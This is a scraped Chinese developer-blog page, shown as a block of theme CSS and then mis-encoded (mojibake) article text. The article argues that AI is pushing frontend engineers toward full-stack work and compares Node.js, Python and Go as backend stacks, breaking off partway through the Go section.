.35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p>æˆ‘æ­£åœ¨å¼€å‘ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxun082%2FDocFlow" target="_blank" title="https://github.com/xun082/DocFlow" ref="nofollow noopener noreferrer">DocFlow</a>ï¼Œå®ƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„ AI å…¨æ ˆååŒæ–‡æ¡£å¹³å°ã€‚è¯¥é¡¹ç›®èåˆäº†å¤šä¸ªæŠ€æœ¯æ ˆï¼ŒåŒ…æ‹¬åŸºäº <code>Tiptap</code> çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ã€<code>NestJs</code> åç«¯æœåŠ¡ã€<code>AI</code> é›†æˆåŠŸèƒ½å’Œå®æ—¶åä½œã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘ç§¯ç´¯äº†ä¸°å¯Œçš„å®æˆ˜ç»éªŒï¼Œæ¶µç›–äº† <code>Tiptap</code> çš„æ·±åº¦å®šåˆ¶ã€æ€§èƒ½ä¼˜åŒ–å’Œåä½œåŠŸèƒ½çš„å®ç°ç­‰æ ¸å¿ƒéš¾ç‚¹ã€‚</p>
</blockquote>
<p>å¦‚æœä½ å¯¹ AI å…¨æ ˆå¼€å‘ã€Tiptap å¯Œæ–‡æœ¬ç¼–è¾‘å™¨å®šåˆ¶æˆ– DocFlow é¡¹ç›®çš„å®Œæ•´æŠ€æœ¯æ–¹æ¡ˆæ„Ÿå…´è¶£ï¼Œæ¬¢è¿åŠ æˆ‘å¾®ä¿¡ <code>yunmz777</code> è¿›è¡Œç§èŠå’¨è¯¢ï¼Œè·å–è¯¦ç»†çš„æŠ€æœ¯åˆ†äº«å’Œæœ€ä½³å®è·µã€‚</p>
<p>æ® <code>å¤§å‚æ—¥æŠ¥</code> ç§°ï¼Œç¾å›¢å±¥çº¦å›¢é˜Ÿè¿‘æœŸæ­£åœ¨æ¨è¡Œ"å…¨æ ˆåŒ–"è½¬å‹ã€‚æ®æ‚‰ï¼Œç»ˆç«¯ç»„çš„éƒ¨åˆ†å‰ç«¯åŒå­¦åœ¨ 11 æœˆæœ«å·¦å³è½¬åˆ°äº†åç«¯ç»„åšå…¨æ ˆï¼ˆå‰åç«¯ä»£ç ä¸€èµ·å†™ï¼‰ï¼Œä¸»è¦æ˜¯ agent ç›¸å…³é¡¹ç›®ã€‚å†…éƒ¨æ‰“å¬äº†ä¸€ä¸‹ï¼Œå›¢å­ç›®å‰å…¨æ ˆå¼€å‘è¿˜ç›¸å¯¹é è°±ï¼Œä¸Šçº¿æŠŠæ§æ¯”è¾ƒä¸¥æ ¼ã€‚</p>
<p>è¿™ä¸€æ¶ˆæ¯åœ¨æŠ€æœ¯åœˆå¼•èµ·äº†å¹¿æ³›å…³æ³¨ï¼Œä¹Ÿåæ˜ äº† AI æ—¶ä»£ä¸‹å‰ç«¯å·¥ç¨‹å¸ˆå‘å…¨æ ˆè½¬å‹çš„å¿…ç„¶è¶‹åŠ¿ã€‚ä½†æ›´é‡è¦çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦æ·±å…¥æ€è€ƒï¼šAI åˆ°åº•ç»™å‰ç«¯å¸¦æ¥äº†ä»€ä¹ˆå†²å‡»ï¼Ÿä¸ºä»€ä¹ˆå‰ç«¯è½¬å…¨æ ˆæˆä¸ºäº†å¿…ç„¶é€‰æ‹©ï¼Ÿ</p>
<p>æœ€è¿‘ï¼Œå‰ç«¯åœˆé‡Œä¸æ–­æœ‰"å‰ç«¯å·²æ­»"çš„è¯è¯­æµå‡ºã€‚æœ‰äººè¯´ AI å·¥å…·ä¼šæ›¿ä»£å‰ç«¯å¼€å‘ï¼Œæœ‰äººè¯´ä½ä»£ç å¹³å°ä¼šè®©å‰ç«¯å¤±ä¸šï¼Œè¿˜æœ‰äººè¯´å‰ç«¯å·¥ç¨‹å¸ˆçš„ä»·å€¼æ­£åœ¨å¿«é€Ÿä¸‹é™ã€‚è¿™äº›å£°éŸ³è™½ç„¶æœ‰äº›æç«¯ï¼Œä½†ç¡®å®åæ˜ äº† AI æ—¶ä»£å‰ç«¯é¢ä¸´çš„çœŸå®æŒ‘æˆ˜ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€AI å¯¹å‰ç«¯çš„å†²å‡»ï¼šæŒ‘æˆ˜ä¸æœºé‡å¹¶å­˜</h2>
<h3 data-id="heading-1">1. ä»£ç ç”Ÿæˆèƒ½åŠ›çš„å†²å‡»</h3>
<p>å†²å‡»ç‚¹ï¼š</p>
<ul>
<li>ä½å¤æ‚åº¦é¡µé¢ç”Ÿæˆï¼šAI å·¥å…·ï¼ˆå¦‚ Claude Codeã€Cursorï¼‰å·²ç»èƒ½å¤Ÿå¿«é€Ÿç”Ÿæˆå¸¸è§çš„ UI ç»„ä»¶ã€é¡µé¢å¸ƒå±€</li>
<li>é‡å¤æ€§å·¥ä½œè¢«æ›¿ä»£ï¼šè¡¨å•ã€åˆ—è¡¨ã€è¯¦æƒ…é¡µç­‰æ ‡å‡†åŒ–é¡µé¢ï¼ŒAI ç”Ÿæˆæ•ˆç‡è¿œè¶…äººå·¥</li>
<li>å­¦ä¹ é—¨æ§›é™ä½ï¼šæ–°æ‰‹å€ŸåŠ© AI ä¹Ÿèƒ½å¿«é€Ÿäº§å‡ºåŸºç¡€ä»£ç ï¼Œå‰ç«¯"å…¥é—¨çº¢åˆ©"æ¶ˆå¤±</li>
</ul>
<p>å½±å“ï¼š
ä¼ ç»Ÿå‰ç«¯å¼€å‘ä¸­ï¼Œå¤§é‡æ—¶é—´èŠ±åœ¨"å†™é¡µé¢"ä¸Šã€‚AI çš„å‡ºç°ï¼Œè®©è¿™éƒ¨åˆ†å·¥ä½œå˜å¾—æå…¶é«˜æ•ˆï¼Œç”šè‡³å¯ä»¥è¯´ï¼Œåªä¼šå†™é¡µé¢çš„å‰ç«¯å·¥ç¨‹å¸ˆï¼Œä»·å€¼æ­£åœ¨å¿«é€Ÿä¸‹é™ã€‚è¿™ä¹Ÿæ­£æ˜¯"å‰ç«¯å·²æ­»"è®ºè°ƒçš„ä¸»è¦ä¾æ®ä¹‹ä¸€ã€‚</p>
<h3 data-id="heading-2">2. ä¸šåŠ¡é€»è¾‘å‰ç§»çš„å†²å‡»</h3>
<p>å†²å‡»ç‚¹ï¼š</p>
<ul>
<li>AI Agent é¡¹ç›®æ¿€å¢ï¼šå¦‚ç¾å›¢æ¡ˆä¾‹ä¸­çš„ agent ç›¸å…³é¡¹ç›®ï¼Œéœ€è¦å‰åç«¯ä¸€ä½“åŒ–å¼€å‘</li>
<li>å®æ—¶äº¤äº’éœ€æ±‚ï¼šAI åº”ç”¨çš„æµå¼å“åº”ã€å®æ—¶å¯¹è¯ï¼Œè¦æ±‚å‰åç«¯ç´§å¯†é…åˆ</li>
<li>æ•°æ®æµè½¬å¤æ‚åŒ–ï¼šAI æ¨¡å‹è°ƒç”¨ã€æ•°æ®å¤„ç†ã€çŠ¶æ€ç®¡ç†ï¼Œéƒ½éœ€è¦å…¨æ ˆè§†è§’</li>
</ul>
<p>å½±å“ï¼š
çº¯å‰ç«¯å·¥ç¨‹å¸ˆåœ¨ AI é¡¹ç›®ä¸­å¾€å¾€åªèƒ½è´Ÿè´£ UI å±‚ï¼Œæ— æ³•æ·±å…¥ä¸šåŠ¡é€»è¾‘ã€‚è€Œ AI é¡¹ç›®çš„æ ¸å¿ƒä»·å€¼åœ¨äºä¸šåŠ¡é€»è¾‘å’Œæ•°æ®å¤„ç†ï¼Œè¿™æ°æ°æ˜¯åç«¯èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-3">3. æŠ€æœ¯æ ˆè¾¹ç•Œçš„æ¨¡ç³Š</h3>
<p>å†²å‡»ç‚¹ï¼š</p>
<ul>
<li>å‰åç«¯ä¸€ä½“åŒ–è¶‹åŠ¿ï¼šNext.jsã€Remix ç­‰å…¨æ ˆæ¡†æ¶å…´èµ·ï¼Œå‰åç«¯ä»£ç åŒä»“åº“</li>
<li>Serverless æ¶æ„ï¼šè¾¹ç¼˜å‡½æ•°ã€API è·¯ç”±ï¼Œå‰ç«¯å¼€å‘è€…éœ€è¦ç†è§£åç«¯é€»è¾‘</li>
<li>AI æœåŠ¡é›†æˆï¼šè°ƒç”¨ AI APIã€å¤„ç†æµå¼æ•°æ®ã€ç®¡ç†çŠ¶æ€ï¼Œéƒ½éœ€è¦åç«¯çŸ¥è¯†</li>
</ul>
<p>å½±å“ï¼š
å‰ç«¯å’Œåç«¯çš„è¾¹ç•Œæ­£åœ¨æ¶ˆå¤±ã€‚åªä¼šå‰ç«¯çš„å‰ç«¯å·¥ç¨‹å¸ˆï¼Œåœ¨ AI æ—¶ä»£ä¼šå‘ç°è‡ªå·±"å¤Ÿä¸ç€"æ ¸å¿ƒä¸šåŠ¡ã€‚</p>
<h3 data-id="heading-4">4. èŒä¸šå‘å±•çš„å¤©èŠ±æ¿</h3>
<p>å†²å‡»ç‚¹ï¼š</p>
<ul>
<li>æŠ€æœ¯æ·±åº¦è¦æ±‚ï¼šAI é¡¹ç›®éœ€è¦ç†è§£æ•°æ®æµã€ç®—æ³•é€»è¾‘ã€ç³»ç»Ÿæ¶æ„</li>
<li>ä¸šåŠ¡ç†è§£èƒ½åŠ›ï¼šå…¨æ ˆå¼€å‘è€…èƒ½æ›´å¥½åœ°ç†è§£ä¸šåŠ¡å…¨è²Œï¼Œåšå‡ºæŠ€æœ¯å†³ç­–</li>
<li>å›¢é˜Ÿåä½œæ•ˆç‡ï¼šå…¨æ ˆå¼€å‘è€…å‡å°‘å‰åç«¯æ²Ÿé€šæˆæœ¬ï¼Œæå‡äº¤ä»˜æ•ˆç‡</li>
</ul>
<p>å½±å“ï¼š
åœ¨ AI æ—¶ä»£ï¼Œåªä¼šå‰ç«¯çš„å‰ç«¯å·¥ç¨‹å¸ˆï¼ŒèŒä¸šå¤©èŠ±æ¿æ˜æ˜¾ã€‚è€Œå…¨æ ˆå¼€å‘è€…èƒ½å¤Ÿï¼š</p>
<ul>
<li>ç‹¬ç«‹è´Ÿè´£å®Œæ•´åŠŸèƒ½æ¨¡å—</li>
<li>æ·±å…¥ç†è§£ä¸šåŠ¡é€»è¾‘</li>
<li>åœ¨æŠ€æœ¯å†³ç­–ä¸­å‘æŒ¥æ›´å¤§ä½œç”¨</li>
</ul>
<h2 data-id="heading-5">äºŒã€ä¸ºä»€ä¹ˆå‰ç«¯è½¬å…¨æ ˆæ˜¯å¿…ç„¶é€‰æ‹©ï¼Ÿ</h2>
<h3 data-id="heading-6">1. AI é¡¹ç›®çš„æœ¬è´¨éœ€æ±‚</h3>
<p>æ­£å¦‚ç¾å›¢æ¡ˆä¾‹æ‰€ç¤ºï¼ŒAI é¡¹ç›®ï¼ˆç‰¹åˆ«æ˜¯ Agent é¡¹ç›®ï¼‰çš„ç‰¹ç‚¹ï¼š</p>
<ul>
<li>å‰åç«¯ä»£ç ä¸€èµ·å†™ï¼šä¸šåŠ¡é€»è¾‘å¤æ‚ï¼Œéœ€è¦å‰åç«¯ååŒ</li>
<li>æ•°æ®æµå¤„ç†ï¼šAI æ¨¡å‹çš„è¾“å…¥è¾“å‡ºã€æµå¼å“åº”å¤„ç†</li>
<li>çŠ¶æ€ç®¡ç†å¤æ‚ï¼šå¯¹è¯çŠ¶æ€ã€ä¸Šä¸‹æ–‡ç®¡ç†ã€é”™è¯¯å¤„ç†</li>
</ul>
<p>è¿™äº›éœ€æ±‚ï¼Œçº¯å‰ç«¯å·¥ç¨‹å¸ˆæ— æ³•ç‹¬ç«‹å®Œæˆï¼Œå¿…é¡»æŒæ¡åç«¯èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-7">2. æŠ€æœ¯å‘å±•çš„è¶‹åŠ¿</h3>
<ul>
<li>å…¨æ ˆæ¡†æ¶æ™®åŠï¼šNext.jsã€Remixã€SvelteKit ç­‰ï¼Œéƒ½åœ¨æ¨åŠ¨å…¨æ ˆå¼€å‘</li>
<li>è¾¹ç¼˜è®¡ç®—å…´èµ·ï¼šCloudflare Workersã€Vercel Edge Functionsï¼Œå‰ç«¯éœ€è¦å†™åç«¯é€»è¾‘</li>
<li>å¾®å‰ç«¯ + å¾®æœåŠ¡ï¼šå‰åç«¯ä¸€ä½“åŒ–éƒ¨ç½²ï¼Œé™ä½ç³»ç»Ÿå¤æ‚åº¦</li>
</ul>
<h3 data-id="heading-8">3. å¸‚åœºéœ€æ±‚çš„è½¬å˜</h3>
<ul>
<li>æ‹›è˜è¦æ±‚å˜åŒ–ï¼šè¶Šæ¥è¶Šå¤šçš„å²—ä½è¦æ±‚"å…¨æ ˆèƒ½åŠ›"</li>
<li>é¡¹ç›®äº¤ä»˜æ•ˆç‡ï¼šå…¨æ ˆå¼€å‘è€…èƒ½ç‹¬ç«‹äº¤ä»˜åŠŸèƒ½ï¼Œå‡å°‘æ²Ÿé€šæˆæœ¬</li>
<li>æŠ€æœ¯å†³ç­–èƒ½åŠ›ï¼šå…¨æ ˆå¼€å‘è€…èƒ½æ›´å¥½åœ°è¯„ä¼°æŠ€æœ¯æ–¹æ¡ˆ</li>
</ul>
<h2 data-id="heading-9">ä¸‰ã€åç«¯æŠ€æœ¯æ ˆçš„é€‰æ‹©ï¼šNode.jsã€Pythonã€Go</h2>
<p>å¯¹äºå‰ç«¯è½¬å…¨æ ˆï¼Œåç«¯æŠ€æœ¯æ ˆçš„é€‰æ‹©è‡³å…³é‡è¦ã€‚ä¸åŒæŠ€æœ¯æ ˆæœ‰ä¸åŒä¼˜åŠ¿ï¼Œéœ€è¦æ ¹æ®é¡¹ç›®éœ€æ±‚é€‰æ‹©ã€‚</p>
<h3 data-id="heading-10">1. Node.js + Nest.jsï¼šå‰ç«¯è½¬å…¨æ ˆçš„æœ€ä½³èµ·ç‚¹</h3>
<p>ä¼˜åŠ¿ï¼š</p>
<ul>
<li>é›¶è¯­è¨€åˆ‡æ¢ï¼šJavaScript/TypeScript å‰åç«¯é€šç”¨</li>
<li>ç”Ÿæ€ç»Ÿä¸€ï¼šnpm åŒ…å‰åç«¯å…±äº«ï¼Œå·¥å…·é“¾ä¸€è‡´</li>
<li>å­¦ä¹ æˆæœ¬ä½ï¼šåˆ©ç”¨ç°æœ‰æŠ€èƒ½ï¼Œå¿«é€Ÿä¸Šæ‰‹</li>
<li>AI é›†æˆå‹å¥½ï¼šLangChain.jsã€OpenAI SDK ç­‰å®Œå–„æ”¯æŒ</li>
</ul>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>Web åº”ç”¨åç«¯</li>
<li>å®æ—¶åº”ç”¨ï¼ˆWebSocketã€SSEï¼‰</li>
<li>å¾®æœåŠ¡æ¶æ„</li>
<li>AI Agent é¡¹ç›®ï¼ˆå¦‚ç¾å›¢æ¡ˆä¾‹ï¼‰</li>
</ul>
<p>å­¦ä¹ è·¯å¾„ï¼š</p>
<ol>
<li>Node.js åŸºç¡€ï¼ˆäº‹ä»¶å¾ªç¯ã€æ¨¡å—ç³»ç»Ÿï¼‰</li>
<li>Nest.js æ¡†æ¶ï¼ˆæ¨¡å—åŒ–ã€ä¾èµ–æ³¨å…¥ï¼‰</li>
<li>æ•°æ®åº“é›†æˆï¼ˆTypeORMã€Prismaï¼‰</li>
<li>AI æœåŠ¡é›†æˆï¼ˆOpenAIã€æµå¼å¤„ç†ï¼‰</li>
</ol>
<h3 data-id="heading-11">2. Python + FastAPIï¼šAI é¡¹ç›®çš„é¦–é€‰</h3>
<p>ä¼˜åŠ¿ï¼š</p>
<ul>
<li>AI ç”Ÿæ€æœ€å®Œå–„ï¼šOpenAIã€LangChainã€LlamaIndex ç­‰åŸç”Ÿæ”¯æŒ</li>
<li>æ•°æ®ç§‘å­¦èƒ½åŠ›ï¼šNumPyã€Pandas ç­‰æ•°æ®å¤„ç†åº“</li>
<li>å¿«é€Ÿå¼€å‘ï¼šè¯­æ³•ç®€æ´ï¼Œå¼€å‘æ•ˆç‡é«˜</li>
<li>æ¨¡å‹éƒ¨ç½²ï¼šTensorFlowã€PyTorch ç­‰æ¨¡å‹æ¡†æ¶</li>
</ul>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>AI/ML é¡¹ç›®</li>
<li>æ•°æ®åˆ†æåç«¯</li>
<li>ç§‘å­¦è®¡ç®—æœåŠ¡</li>
<li>Agent é¡¹ç›®ï¼ˆéœ€è¦å¤æ‚ AI é€»è¾‘ï¼‰</li>
</ul>
<p>å­¦ä¹ è·¯å¾„ï¼š</p>
<ol>
<li>Python åŸºç¡€ï¼ˆè¯­æ³•ã€æ•°æ®ç»“æ„ï¼‰</li>
<li>FastAPI æ¡†æ¶ï¼ˆå¼‚æ­¥ã€ç±»å‹æç¤ºï¼‰</li>
<li>AI åº“é›†æˆï¼ˆOpenAIã€LangChainï¼‰</li>
<li>æ•°æ®å¤„ç†ï¼ˆPandasã€NumPyï¼‰</li>
</ol>
<h3 data-id="heading-12">3. Goï¼šé«˜æ€§èƒ½åœºæ™¯çš„é€‰æ‹©</h3>
<p>ä¼˜åŠ¿ï¼š</p>
<ul>
<li>æ€§èƒ½ä¼˜ç§€ï¼šç¼–è¯‘å‹è¯­è¨€ï¼Œæ‰§è¡Œæ•ˆç‡é«˜</li>
<li>å¹¶å‘èƒ½åŠ›å¼ºï¼šGoroutine å¹¶å‘æ¨¡å‹</li>
